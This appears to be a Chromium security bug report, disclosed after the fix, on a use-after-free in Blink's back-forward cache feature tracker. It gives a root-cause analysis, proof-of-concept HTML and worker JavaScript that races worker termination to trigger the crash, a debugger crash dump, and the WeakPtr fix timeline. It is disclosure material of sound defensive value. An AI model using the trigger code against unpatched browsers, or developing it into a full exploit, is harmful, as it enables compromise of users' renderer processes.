# Use After Free in BackForwardCacheDisablingFeatureTracker::ReportFeaturesToDelegate()

| Field | Value |
|-------|-------|
| **Issue ID** | [336012573](https://issues.chromium.org/issues/336012573) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink>Scheduling |
| **Platforms** | Windows |
| **Reporter** | lo...@gmail.com |
| **Assignee** | yu...@chromium.org |
| **Created** | 2024-04-21 |
| **Bounty** | $11,000.00 |

## Description

VULNERABILITY DETAILS
Specifically crafted HTML file can trigger Use After Free of DedicatedWorkerGlobalScope object  in BackForwardCacheDisablingFeatureTracker::ReportFeaturesToDelegate(). This bug can potentially be exploited to achieve one click Remote Code Execution in a renderer process.

The bug lies in BackForwardCacheDisablingFeatureTracker and the tearing down of Worker and Broadcast Channel.

In the PoC, a dedicated worker ("worker0.js") is created by the main web page:
	worker0 = new Worker("worker0.js");
  
In worker "worker0.js", a sub worker ("embeddedworker.js") and a BroadcastChannel are instantiated:
	var embeddedworker = new Worker("embeddedworker.js");
	var bc0 = new BroadcastChannel("test_channel");

WorkerSchedulerImpl has member back_forward_cache_disabling_feature_tracker_, of which the delegate_ is set to the corresponding global scope object when the worke thread is initialized:

	void WorkerThread::InitializeOnWorkerThread()
		worker_scheduler_->InitializeOnWorkerThread(global_scope_);
		WorkerSchedulerImpl::InitializeOnWorkerThread()	
			back_forward_cache_disabling_feature_tracker_.SetDelegate(delegate);

Normally, when a worker is terminated by its parent context from JS (e.g. "worker0.terminate();" from the PoC), among other things, WorkerThread::PrepareForShutdownOnWorkerThread() and WorkerThread::PerformShutdownOnWorkerThread() are scheduled to be executed in tandem:

	void WorkerThread::Terminate() {
	...

	  scoped_refptr<base::SingleThreadTaskRunner> task_runner =
		  GetWorkerBackingThread().BackingThread().GetTaskRunner();
	  PostCrossThreadTask(
		  *task_runner, FROM_HERE,
		  CrossThreadBindOnce(&WorkerThread::PrepareForShutdownOnWorkerThread,
							  CrossThreadUnretained(this)));
	  PostCrossThreadTask(
		  *task_runner, FROM_HERE,
		  CrossThreadBindOnce(&WorkerThread::PerformShutdownOnWorkerThread,
							  CrossThreadUnretained(this)));
	...
	}						  

Callback WorkerThread::PrepareForShutdownOnWorkerThread() would lead to calling of BroadcastChannel::CloseInternal(), which leads to calling of BackForwardCacheDisablingFeatureTracker::NotifyDelegateAboutFeaturesAfterCurrentTask(). Then BackForwardCacheDisablingFeatureTracker::ReportFeaturesToDelegate() is scheduled to be executed after the current task:

	WorkerThread::PrepareForShutdownOnWorkerThread()
		GlobalScope()->NotifyContextDestroyed()
		ContextLifecycleNotifier::NotifyContextDestroyed()
			ContextLifecycleObserver::NotifyContextDestroyed()
				BroadcastChannel::CloseInternal()
					feature_handle_for_scheduler_.reset()
					FrameOrWorkerScheduler::SchedulingAffectingFeatureHandle::reset()
						WorkerSchedulerImpl::OnStoppedUsingNonStickyFeature()
							BackForwardCacheDisablingFeatureTracker::Remove()
								NotifyDelegateAboutFeaturesAfterCurrentTask(BackForwardCacheDisablingFeatureTracker::TracingType::kEnd, feature)
								BackForwardCacheDisablingFeatureTracker::NotifyDelegateAboutFeaturesAfterCurrentTask()
										scheduler_->ExecuteAfterCurrentTask(base::BindOnce(&BackForwardCacheDisablingFeatureTracker::ReportFeaturesToDelegate,weak_factory_.GetWeakPtr()));

After the obove task, ReportFeaturesToDelegate() gets executed and the calling of UpdateBackForwardCacheDisablingFeatures() against delegate_ is fine cause DedicatedWorkerGlobalScope object is still alive.

	void BackForwardCacheDisablingFeatureTracker::ReportFeaturesToDelegate() {
	  ...
	  delegate_->UpdateBackForwardCacheDisablingFeatures(details);
	  ...
	}

Then callback WorkerThread::PerformShutdownOnWorkerThread() would descruct DedicatedWorkerGlobalScope:

	WorkerThread::PerformShutdownOnWorkerThread()
		WorkerBackingThread::ShutdownOnBackingThread()
			NonMainThreadImpl::ShutdownOnThread()
				NonMainThreadImpl::SimpleThreadImpl::ShutdownOnThread()
					gc_support_.reset()
						NonMainThreadImpl::GCSupport::~GCSupport()
							ThreadState::DetachCurrentThread()
								ThreadState::~ThreadState()
									HeapBase::Terminate()
										SweeperImpl::FinishIfRunning()
											...
												DedicatedWorkerGlobalScope::~DedicatedWorkerGlobalScope()

However, in the case of two hierarchical workers as the PoC,  "worker0.js" is created by the main page, while "embeddedworker.js" is created by "worker0.js". The terminations of  worker0 and embeddedworker (by calling "terminate()" from the parent context) can be racy.

In the PoC, the sub worker 	"embeddedworker.js"  does not do any meaningful work. Nonetheless JS code "embeddedworker.terminate()" from worker0.js would shut down worker "embeddedworker.js" similar to the obove procedure(PrepareForShutdownOnWorkerThread and PerformShutdownOnWorkerThread). However, this two step procedure is not the only way of shutting down a worker thread. If certain condition is met, the tearing down of the sub worker thread can trigger the tearing down of the parent worker thread, and more importantly in a single step (PerformShutdownOnWorkerThread).

As part of the shut down procedure of the  sub worker "embeddedworker.js", task ThreadedMessagingProxyBase::WorkerThreadTerminated() is scheduled:

WorkerThread::PerformShutdownOnWorkerThread()
	GetWorkerReportingProxy().DidTerminateWorkerThread()
	ThreadedObjectProxyBase::DidTerminateWorkerThread() 
		    PostCrossThreadTask(*GetParentAgentGroupTaskRunner(), FROM_HERE,CrossThreadBindOnce(&ThreadedMessagingProxyBase::WorkerThreadTerminated, MessagingProxyWeakPtr()));
			
In ThreadedMessagingProxyBase::WorkerThreadTerminated(), parent worker thread's ChildThreadTerminatedOnWorkerThread() is called:

	void ThreadedMessagingProxyBase::WorkerThreadTerminated() {
	  ...
	  if (parent_thread && child_thread)
		parent_thread->ChildThreadTerminatedOnWorkerThread(child_thread.get());
	  ...
	}

If requested_to_terminate_ had been set to true because of "worker0.terminate();", CheckRequestedToTerminate() would returns true and so the parent worker thread object's PerformShutdownOnWorkerThread() would be called according to the following code:

	void WorkerThread::ChildThreadTerminatedOnWorkerThread(WorkerThread* child) {
	  ...
	  if (child_threads_.empty() && CheckRequestedToTerminate())
		PerformShutdownOnWorkerThread();
	}

The parent worker thread object's PerformShutdownOnWorkerThread() would excute BroadcastChannel::CloseInternal() and the descructor of DedicatedWorkerGlobalScope in the same task. According to the obove analysis, BroadcastChannel::CloseInternal() leads to BackForwardCacheDisablingFeatureTracker::ReportFeaturesToDelegate() being scheduled to be executed after the current task. therefore BackForwardCacheDisablingFeatureTracker::ReportFeaturesToDelegate() is executed after the DedicatedWorkerGlobalScope object is freed, thus "delegate_->UpdateBackForwardCacheDisablingFeatures(details)" is Use After Free.
 
 


VERSION
	Google Chrome	124.0.6367.61 (Official Build) (64-bit) (cohort: Stable Installs & Version Pins) 
	Revision	8771130bd84f76d855ae42fbe02752b03e352f17-refs/branch-heads/6367@{#798}
	OS	Windows 11 Version 22H2 (Build 22621.3447)
	JavaScript	V8 12.4.254.12

BISECT
	Commit that introduced the bug :
		https://source.chromium.org/chromium/chromium/src/+/885d999f3c1306166df22f1fd4fd996ba4c4cee0 


	Active release branches that are impacted:
		Version 126.0.6423.2 (Official Build) dev (64-bit)
		Version 125.0.6422.4 (Official Build) beta (64-bit)
		Version 124.0.6367.61 (Official Build) (64-bit)
		

REPRODUCTION CASE  (whole server code in UAF_ReportFeaturesToDelegate_PoC.js)

Main page code:

	<script>
	var delDbReq =  indexedDB.deleteDatabase("TestDb1"); 
	worker0 = new Worker("worker0.js");
	worker0.onerror=function(){
		worker0.terminate();
	};
	var dbreq0= indexedDB.open("TestDb1",  2);
	dbreq0.onupgradeneeded = function(event) {  a= b; 
	};
	setTimeout(function(){location.reload()},300);
	</script>

Worker code (worker0.js):
	var embeddedworker = new Worker("embeddedworker.js");  
	var bc0 = new BroadcastChannel("test_channel");
	onerror  = function (e) {
	embeddedworker.terminate();
	  gc(); 
	 };
	gc = function() 
	{
	  for (var i = 0; i < 0x20000; ++i)
		var s = new String('AAAA');
	};

	var dbreq0= indexedDB.open("TestDb1",  2);
	 dbreq0.onsuccess = function(event) { db = dbreq0.result;
	  var transaction = db.transaction(["customers"], "readwrite");  
	};

Steps to reproduce:
1) Run the PoC with NodeJS: node UAF_ReportFeaturesToDelegate_PoC.js
2) Enter http://localhost:12345/ from the chrome browser

    
FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION
Type of crash: tab
Crash State: 



(9fa8.b15c): Access violation - code c0000005 (!!! second chance !!!)
chrome!blink::scheduler::BackForwardCacheDisablingFeatureTracker::ReportFeaturesToDelegate+0x145:
00007ff8`4895eb65 488b07          mov     rax,qword ptr [rdi] ds:00000321`01b219f8=????????????????
22:477> r
rax=00002c8000000000 rbx=0000055c006861b8 rcx=0000000000000000
rdx=00000089807fea50 rsi=0000055c006861a8 rdi=0000032101b219f8
rip=00007ff84895eb65 rsp=00000089807fea30 rbp=0000000000000000
 r8=0000000000000000  r9=0000000000000083 r10=00000000546c6148
r11=00000000184eb297 r12=0000000000000000 r13=0000000000000008
r14=0000055c00000000 r15=0000055c00000000
iopl=0         nv up ei ng nz na po cy
cs=0033  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010285
chrome!blink::scheduler::BackForwardCacheDisablingFeatureTracker::ReportFeaturesToDelegate+0x145:
00007ff8`4895eb65 488b07          mov     rax,qword ptr [rdi] ds:00000321`01b219f8=????????????????
22:477> dv
           this = <value unavailable>
        details = struct blink::FrameOrWorkerScheduler::Delegate::BlockingDetails
22:477> k
 # Child-SP          RetAddr               Call Site
00 00000089`807fea30 00007ff8`49357118     chrome!blink::scheduler::BackForwardCacheDisablingFeatureTracker::ReportFeaturesToDelegate+0x145 [C:\b\s\w\ir\cache\builder\src\third_party\blink\renderer\platform\scheduler\common\back_forward_cache_disabling_feature_tracker.cc @ 166] 
01 (Inline Function) --------`--------     chrome!base::internal::DecayedFunctorTraits<void (blink::scheduler::BackForwardCacheDisablingFeatureTracker::*)(),base::WeakPtr<blink::scheduler::BackForwardCacheDisablingFeatureTracker> &&>::Invoke+0x35 [C:\b\s\w\ir\cache\builder\src\base\functional\bind_internal.h @ 738] 
02 (Inline Function) --------`--------     chrome!base::internal::InvokeHelper<1,base::internal::FunctorTraits<void (blink::scheduler::BackForwardCacheDisablingFeatureTracker::*&&)(),base::WeakPtr<blink::scheduler::BackForwardCacheDisablingFeatureTracker> &&>,void,0>::MakeItSo+0x4c [C:\b\s\w\ir\cache\builder\src\base\functional\bind_internal.h @ 954] 
03 (Inline Function) --------`--------     chrome!base::internal::Invoker<base::internal::FunctorTraits<void (blink::scheduler::BackForwardCacheDisablingFeatureTracker::*&&)(),base::WeakPtr<blink::scheduler::BackForwardCacheDisablingFeatureTracker> &&>,base::internal::BindState<1,1,0,void (blink::scheduler::BackForwardCacheDisablingFeatureTracker::*)(),base::WeakPtr<blink::scheduler::BackForwardCacheDisablingFeatureTracker> >,void ()>::RunImpl+0x4c [C:\b\s\w\ir\cache\builder\src\base\functional\bind_internal.h @ 1067] 
04 (Inline Function) --------`--------     chrome!base::internal::Invoker<base::internal::FunctorTraits<void (blink::scheduler::BackForwardCacheDisablingFeatureTracker::*&&)(),base::WeakPtr<blink::scheduler::BackForwardCacheDisablingFeatureTracker> &&>,base::internal::BindState<1,1,0,void (blink::scheduler::BackForwardCacheDisablingFeatureTracker::*)(),base::WeakPtr<blink::scheduler::BackForwardCacheDisablingFeatureTracker> >,void ()>::RunOnce+0x4c [C:\b\s\w\ir\cache\builder\src\base\functional\bind_internal.h @ 980] 
05 (Inline Function) --------`--------     chrome!base::OnceCallback<void ()>::Run+0x7a [C:\b\s\w\ir\cache\builder\src\base\functional\callback.h @ 156] 
06 (Inline Function) --------`--------     chrome!blink::scheduler::ThreadSchedulerBase::DispatchOnTaskCompletionCallbacks+0x1d8 [C:\b\s\w\ir\cache\builder\src\third_party\blink\renderer\platform\scheduler\common\thread_scheduler_base.cc @ 130] 
07 00000089`807feaa0 00007ff8`48700487     chrome!blink::scheduler::WorkerThreadScheduler::OnTaskCompleted+0x248 [C:\b\s\w\ir\cache\builder\src\third_party\blink\renderer\platform\scheduler\worker\worker_thread_scheduler.cc @ 207] 
08 (Inline Function) --------`--------     chrome!blink::scheduler::NonMainThreadTaskQueue::OnTaskCompleted+0x2b5 [C:\b\s\w\ir\cache\builder\src\third_party\blink\renderer\platform\scheduler\worker\non_main_thread_task_queue.cc @ 73] 
09 (Inline Function) --------`--------     chrome!base::internal::DecayedFunctorTraits<void (blink::scheduler::NonMainThreadTaskQueue::*)(const base::sequence_manager::Task &, base::sequence_manager::TaskQueue::TaskTiming *, base::LazyNow *),blink::scheduler::NonMainThreadTaskQueue *>::Invoke+0x2b5 [C:\b\s\w\ir\cache\builder\src\base\functional\bind_internal.h @ 738] 
0a (Inline Function) --------`--------     chrome!base::internal::InvokeHelper<0,base::internal::FunctorTraits<void (blink::scheduler::NonMainThreadTaskQueue::*const &)(const base::sequence_manager::Task &, base::sequence_manager::TaskQueue::TaskTiming *, base::LazyNow *),blink::scheduler::NonMainThreadTaskQueue *>,void,0>::MakeItSo+0x2b5 [C:\b\s\w\ir\cache\builder\src\base\functional\bind_internal.h @ 930] 
0b (Inline Function) --------`--------     chrome!base::internal::Invoker<base::internal::FunctorTraits<void (blink::scheduler::NonMainThreadTaskQueue::*const &)(const base::sequence_manager::Task &, base::sequence_manager::TaskQueue::TaskTiming *, base::LazyNow *),blink::scheduler::NonMainThreadTaskQueue *>,base::internal::BindState<1,1,0,void (blink::scheduler::NonMainThreadTaskQueue::*)(const base::sequence_manager::Task &, base::sequence_manager::TaskQueue::TaskTiming *, base::LazyNow *),base::internal::UnretainedWrapper<blink::scheduler::NonMainThreadTaskQueue,base::unretained_traits::MayNotDangle,0> >,void (const base::sequence_manager::Task &, base::sequence_manager::TaskQueue::TaskTiming *, base::LazyNow *)>::RunImpl+0x2b5 [C:\b\s\w\ir\cache\builder\src\base\functional\bind_internal.h @ 1067] 
0c (Inline Function) --------`--------     chrome!base::internal::Invoker<base::internal::FunctorTraits<void (blink::scheduler::NonMainThreadTaskQueue::*const &)(const base::sequence_manager::Task &, base::sequence_manager::TaskQueue::TaskTiming *, base::LazyNow *),blink::scheduler::NonMainThreadTaskQueue *>,base::internal::BindState<1,1,0,void (blink::scheduler::NonMainThreadTaskQueue::*)(const base::sequence_manager::Task &, base::sequence_manager::TaskQueue::TaskTiming *, base::LazyNow *),base::internal::UnretainedWrapper<blink::scheduler::NonMainThreadTaskQueue,base::unretained_traits::MayNotDangle,0> >,void (const base::sequence_manager::Task &, base::sequence_manager::TaskQueue::TaskTiming *, base::LazyNow *)>::Run+0x2b5 [C:\b\s\w\ir\cache\builder\src\base\functional\bind_internal.h @ 987] 
0d (Inline Function) --------`--------     chrome!base::RepeatingCallback<void (const base::sequence_manager::Task &, base::sequence_manager::TaskQueue::TaskTiming *, base::LazyNow *)>::Run+0x2b5 [C:\b\s\w\ir\cache\builder\src\base\functional\callback.h @ 344] 
0e (Inline Function) --------`--------     chrome!base::sequence_manager::internal::TaskQueueImpl::OnTaskCompleted+0x2b5 [C:\b\s\w\ir\cache\builder\src\base\task\sequence_manager\task_queue_impl.cc @ 1371] 
0f (Inline Function) --------`--------     chrome!base::sequence_manager::internal::SequenceManagerImpl::NotifyDidProcessTask+0xc27 [C:\b\s\w\ir\cache\builder\src\base\task\sequence_manager\sequence_manager_impl.cc @ 905] 
10 00000089`807feb20 00007ff8`48787f80     chrome!base::sequence_manager::internal::SequenceManagerImpl::DidRunTask+0xcb7 [C:\b\s\w\ir\cache\builder\src\base\task\sequence_manager\sequence_manager_impl.cc @ 674] 
11 (Inline Function) --------`--------     chrome!base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWorkImpl+0x791 [C:\b\s\w\ir\cache\builder\src\base\task\sequence_manager\thread_controller_with_message_pump_impl.cc @ 489] 
12 00000089`807fec20 00007ff8`49898818     chrome!base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWork+0x840 [C:\b\s\w\ir\cache\builder\src\base\task\sequence_manager\thread_controller_with_message_pump_impl.cc @ 338] 
13 00000089`807ff3d0 00007ff8`496b1c0a     chrome!base::MessagePumpDefault::Run+0x78 [C:\b\s\w\ir\cache\builder\src\base\message_loop\message_pump_default.cc @ 42] 
14 00000089`807ff470 00007ff8`46810b82     chrome!base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::Run+0xea [C:\b\s\w\ir\cache\builder\src\base\task\sequence_manager\thread_controller_with_message_pump_impl.cc @ 644] 
15 00000089`807ff4f0 00007ff8`4680ff08     chrome!base::RunLoop::Run+0x1e2 [C:\b\s\w\ir\cache\builder\src\base\run_loop.cc @ 136] 
16 00000089`807ff620 00007ff8`462de84d     chrome!blink::scheduler::NonMainThreadImpl::SimpleThreadImpl::Run+0x2d8 [C:\b\s\w\ir\cache\builder\src\third_party\blink\renderer\platform\scheduler\worker\non_main_thread_impl.cc @ 189] 
17 00000089`807ff710 00007ff8`b98f257d     chrome!base::`anonymous namespace'::ThreadFunc+0x11d [C:\b\s\w\ir\cache\builder\src\base\threading\platform_thread_win.cc @ 133] 
18 00000089`807ff7a0 00007ff8`bbc0aa48     KERNEL32!BaseThreadInitThunk+0x1d
19 00000089`807ff7d0 00000000`00000000     ntdll!RtlUserThreadStart+0x28




	
CREDIT INFORMATION
Reporter credit: Looben Yang


## Attachments

- [UAF_ReportFeaturesToDelegate_PoC.js](attachments/UAF_ReportFeaturesToDelegate_PoC.js) (text/javascript, 2.1 KB)

## Timeline

### cl...@appspot.gserviceaccount.com (2024-04-22)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=6250425700253696.

### sk...@google.com (2024-04-22)

Assigning this as S1, given the comment above "This bug can potentially be exploited to achieve one click Remote Code Execution in a renderer process".

### kd...@chromium.org (2024-04-23)

I think this is assigned to me because I was the last person who happened to touch that file, wrapping `BackForwardCacheDisablingFeatureTracker::delegate_` in `raw_ptr` (i.e. <https://crrev.com/c/4904523>).

Unfortunately, the only commentary I can provide is that MiraclePtr is not yet launched to the renderer process, so it's not widely available in stable - so it cannot be relied on for lowering the severity of this particular case.

Tentatively passing this onward to Fergal for triage.

### fe...@chromium.org (2024-04-23)

Yuzu, please fix.

### pe...@google.com (2024-04-23)

Setting milestone because of s0/s1 severity.

### ja...@chromium.org (2024-05-03)

It looks like clusterfuzz failed on the previous example because it was trying to run the nodsjs file. I'll start another attempt using an archive that contains the provided index.html, worker0.js and embeddedworker.js.

### cl...@appspot.gserviceaccount.com (2024-05-03)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=4830394617626624.

### ja...@chromium.org (2024-05-03)

I've also schedule sent an email to yuzus to ask for an update.

### 24...@project.gserviceaccount.com (2024-05-03)

Testcase 4830394617626624 failed to reproduce the crash. Please inspect the program output at https://clusterfuzz.com/testcase?key=4830394617626624.

### cl...@appspot.gserviceaccount.com (2024-05-03)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=5746359123509248.

### ap...@google.com (2024-05-07)

Project: chromium/src
Branch: main

commit da7a6845e589dc71da9898f7e181a7c88a62e2e1
Author: rubberyuzu <yuzus@chromium.org>
Date:   Tue May 07 01:27:34 2024

    [bfcache] Use WeakPtr for delegate_
    
    This CL starts using a WeakPtr for `delegate_`. This is because
    `ReportFeaturesToDelegate()` is posted and when it's executed,
    `delegate_` might be destroyed.
    
    Bug: 336012573
    Change-Id: I9aa5ee7ae7d484d4208e6bdd8ea2853763d69a6b
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/5493004
    Reviewed-by: Kentaro Hara <haraken@chromium.org>
    Commit-Queue: Yuzu Saijo <yuzus@chromium.org>
    Reviewed-by: Fergal Daly <fergal@chromium.org>
    Cr-Commit-Position: refs/heads/main@{#1297242}

M       third_party/blink/renderer/platform/scheduler/common/back_forward_cache_disabling_feature_tracker.cc
M       third_party/blink/renderer/platform/scheduler/common/back_forward_cache_disabling_feature_tracker.h
M       third_party/blink/renderer/platform/scheduler/public/frame_or_worker_scheduler.h

https://chromium-review.googlesource.com/5493004


### pe...@google.com (2024-05-09)

yuzus: Uh oh! This issue still open and hasn't been updated in the last 14 days. This is a serious vulnerability, and we want to ensure that there's progress. Could you please leave an update with the current status and any potential blockers?

If you're not the right owner for this issue, could you please remove yourself as soon as possible or help us find the right one?

If the issue is fixed or you can't reproduce it, please close the bug. If you've started working on a fix, please set the status to Started.

Thanks for your time! To disable nags, add Disable-Nags (case sensitive) to the Chromium Labels custom field.

### pe...@google.com (2024-05-10)

Requesting merge to extended stable (M124) because latest trunk commit (1297242) appears to be after extended stable branch point (1274542).
Requesting merge to stable (M125) because latest trunk commit (1297242) appears to be after stable branch point (1287751).
Merge review required: M124 is already shipping to stable.


Merge review required: M125 has already been cut for stable release.


Thank you for fixing this security bug! We aim to ship security fixes as quickly as possible, to limit their opportunity for exploitation as an "n-day" (that is, a bug where git fixes are developed into attacks before those fixes reach users).

We have determined this fix is necessary on milestone(s): [124, 125].

Please answer the following questions so that we can safely process this merge request:
1. Which CLs should be backmerged? (Please include Gerrit links.)
2. Has this fix been verified on Canary to not pose any stability regressions?
3. Does this fix pose any potential non-verifiable stability risks?
4. Does this fix pose any known compatibility risks?
5. Does it require manual verification by the test team? If so, please describe required testing.


### am...@chromium.org (2024-05-13)

yuzus@ -- thanks for landing a fix for this issue. Just reaching out to let you know that this is indeed in security's queue for merge review. Since M125 Stable RC is being recut tomorrow for release on Wednesday, we are delaying backmerge for any fixes a bit longer until the recut of M125 Stable is complete and the M124 Extended Stable RC is also cut.
Once that occur's we'll review for backmerge and hopefully get this fix into next week's M125 Stable update.

### pe...@google.com (2024-05-15)

Requesting merge to extended stable (M124) because latest trunk commit (1297242) appears to be after extended stable branch point (1274542).
Requesting merge to stable (M125) because latest trunk commit (1297242) appears to be after stable branch point (1287751).
Not requesting merge to dev (M126) because latest trunk commit (1297242) appears to be prior to dev branch point (1300313). If this is incorrect please remove NA-126 from the 'Merge' field and add 126 to the 'Merge-Request' field If other changes are required to fix this bug completely please request a merge if necessary.
Merge review required: M124 is already shipping to stable.


Merge review required: M125 is already shipping to stable.


Thank you for fixing this security bug! We aim to ship security fixes as quickly as possible, to limit their opportunity for exploitation as an "n-day" (that is, a bug where git fixes are developed into attacks before those fixes reach users).

We have determined this fix is necessary on milestone(s): [124, 125].

Please answer the following questions so that we can safely process this merge request:
1. Which CLs should be backmerged? (Please include Gerrit links.)
2. Has this fix been verified on Canary to not pose any stability regressions?
3. Does this fix pose any potential non-verifiable stability risks?
4. Does this fix pose any known compatibility risks?
5. Does it require manual verification by the test team? If so, please describe required testing.


### sp...@google.com (2024-05-15)

** NOTE: This is an automatically generated email **

Hello,

Congratulations! The Chrome Vulnerability Rewards Program (VRP) Panel has decided to award you $11000.00 for this report.

Rationale for this decision:
$10,000 for high quality report of memory corruption in a sandboxed process + $1,000 bisect bonus 

Thank you for your efforts and helping us make Chrome more secure for all users!

Cheers,
Chrome VRP Panel Bot


P.S. Two other things we'd like to mention:

* Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.
Please contact security-vrp@chromium.org with any questions.
* If you are already registered with Google as a supplier, p2p-vrp@google.com will reach out to you. If you have already registered, there is no need to repeat the process and you’ll automatically be paid soon. If you have any payment related questions or issues, please reach out to p2p-vrp@google.com.

### am...@chromium.org (2024-05-16)

<https://crrev.com/c/5493004> approved for merge to M125 and M126, please merge this fix to M125 Stable / branch 6422 and M124 Extended Stable / branch 6367 at soonest (before 10am PT tomorrow / Friday) so this fix can be included in the next respective updates next week -- thanks!

### ap...@google.com (2024-05-17)

Project: chromium/src
Branch: refs/branch-heads/6367

commit b922fcb61e3b12cc53d0151605207e8d5578dfa7
Author: rubberyuzu <yuzus@chromium.org>
Date:   Fri May 17 02:53:09 2024

    [bfcache] Use WeakPtr for delegate_
    
    This CL starts using a WeakPtr for `delegate_`. This is because
    `ReportFeaturesToDelegate()` is posted and when it's executed,
    `delegate_` might be destroyed.
    
    (cherry picked from commit da7a6845e589dc71da9898f7e181a7c88a62e2e1)
    
    Bug: 336012573
    Change-Id: I9aa5ee7ae7d484d4208e6bdd8ea2853763d69a6b
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/5493004
    Reviewed-by: Kentaro Hara <haraken@chromium.org>
    Commit-Queue: Yuzu Saijo <yuzus@chromium.org>
    Reviewed-by: Fergal Daly <fergal@chromium.org>
    Cr-Original-Commit-Position: refs/heads/main@{#1297242}
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/5547038
    Auto-Submit: Yuzu Saijo <yuzus@chromium.org>
    Commit-Queue: Kentaro Hara <haraken@chromium.org>
    Cr-Commit-Position: refs/branch-heads/6367@{#1190}
    Cr-Branched-From: d158c6dc6e3604e6f899041972edf26087a49740-refs/heads/main@{#1274542}

M       third_party/blink/renderer/platform/scheduler/common/back_forward_cache_disabling_feature_tracker.cc
M       third_party/blink/renderer/platform/scheduler/common/back_forward_cache_disabling_feature_tracker.h
M       third_party/blink/renderer/platform/scheduler/public/frame_or_worker_scheduler.h

https://chromium-review.googlesource.com/5547038


### ap...@google.com (2024-05-17)

Project: chromium/src
Branch: refs/branch-heads/6422

commit e99ab798445def48c52ed184e16f4550de091db9
Author: rubberyuzu <yuzus@chromium.org>
Date:   Fri May 17 04:33:15 2024

    [bfcache] Use WeakPtr for delegate_
    
    This CL starts using a WeakPtr for `delegate_`. This is because
    `ReportFeaturesToDelegate()` is posted and when it's executed,
    `delegate_` might be destroyed.
    
    (cherry picked from commit da7a6845e589dc71da9898f7e181a7c88a62e2e1)
    
    Bug: 336012573
    Change-Id: I9aa5ee7ae7d484d4208e6bdd8ea2853763d69a6b
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/5493004
    Reviewed-by: Kentaro Hara <haraken@chromium.org>
    Commit-Queue: Yuzu Saijo <yuzus@chromium.org>
    Reviewed-by: Fergal Daly <fergal@chromium.org>
    Cr-Original-Commit-Position: refs/heads/main@{#1297242}
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/5546858
    Commit-Queue: Kentaro Hara <haraken@chromium.org>
    Auto-Submit: Yuzu Saijo <yuzus@chromium.org>
    Bot-Commit: Rubber Stamper <rubber-stamper@appspot.gserviceaccount.com>
    Cr-Commit-Position: refs/branch-heads/6422@{#1043}
    Cr-Branched-From: 9012208d0ce02e0cf0adb9b62558627c356f3278-refs/heads/main@{#1287751}

M       third_party/blink/renderer/platform/scheduler/common/back_forward_cache_disabling_feature_tracker.cc
M       third_party/blink/renderer/platform/scheduler/common/back_forward_cache_disabling_feature_tracker.h
M       third_party/blink/renderer/platform/scheduler/public/frame_or_worker_scheduler.h

https://chromium-review.googlesource.com/5546858


### pe...@google.com (2024-08-17)

This bug has been closed for more than 14 weeks. Removing issue access restrictions.

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/336012573)*
